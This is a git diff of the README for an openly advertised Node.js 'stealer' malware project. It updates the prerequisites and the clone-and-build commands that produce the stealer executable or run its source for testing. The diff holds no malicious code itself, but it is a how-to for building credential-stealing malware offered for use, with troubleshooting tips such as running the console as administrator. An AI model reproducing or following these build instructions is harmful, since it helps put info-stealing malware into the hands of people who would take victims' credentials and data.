@@ -132,9 +132,13 @@ The most comprehensive open-source stealer based on Node.js available on GitHub.
 
 ### Requirements
 
+#### Install Git LTS
+
+- `Download Git` Visit the official <a href="https://git-scm.com/" target="_blank">Git LTS site</a> to download the (LTS) version.
+
 #### Install Node.js LTS
 
-- `Download Node.js` Visit the official <a href="https://nodejs.org/en" target="_blank">Node.js LTS page</a> to download the Long-Term Support (LTS) version.
+- `Download Node.js` Visit the official <a href="https://nodejs.org/en" target="_blank">Node.js LTS site</a> to download the Long-Term Support (LTS) version.
 
 #### Install the Visual C++ Build Environment
 
@@ -149,9 +153,7 @@ to correctly install node-gyp go to its repo: [node-gyp](https://github.com/node
 
 ### Installation
 
-1. Follow these steps to have it or watch the video <a href="https://www.youtube.com/watch?v=4MWMONVS6J4" target="_blank">YouTube!</a>
-
-2. Install [Git](https://git-scm.com/) and then use these commands in the console.
+- Follow these steps to have it or watch the video <a href="https://www.youtube.com/watch?v=4MWMONVS6J4" target="_blank">YouTube!</a>
 
 ## Usage
 
@@ -160,11 +162,15 @@ to correctly install node-gyp go to its repo: [node-gyp](https://github.com/node
 - If an error occurs in the create of your Executable: Try to open the `CMD` with `Administrator Permissions`
 
 ```bash
-git clone https://github.com/k4itrun/wish.git
+git clone https://github.com/k4itrun/wish.git && cd wish
 ```
 
 ```bash
-npm run builder:install && npm run builder:start
+npm install pnpm -g && pnpm setup
+```
+
+```bash
+node --run builder:install && node --run builder:start
 ```
 
 2. But if you just want to **Test the code**, just do:
@@ -174,11 +180,15 @@ npm run builder:install && npm run builder:start
 ![][github-assets-img-config-link]
 
 ```bash
-git clone https://github.com/k4itrun/wish.git
+git clone https://github.com/k4itrun/wish.git && cd wish
 ```
 
 ```bash
-npm run src:install && npm run src:start
+npm install pnpm -g && pnpm setup
+```
+
+```bash
+node --run src:install && node --run src:start
 ```
 
 3. You can also use (`electron-builder`, `pkg`, `nexe`, etc...) to build your own executable.
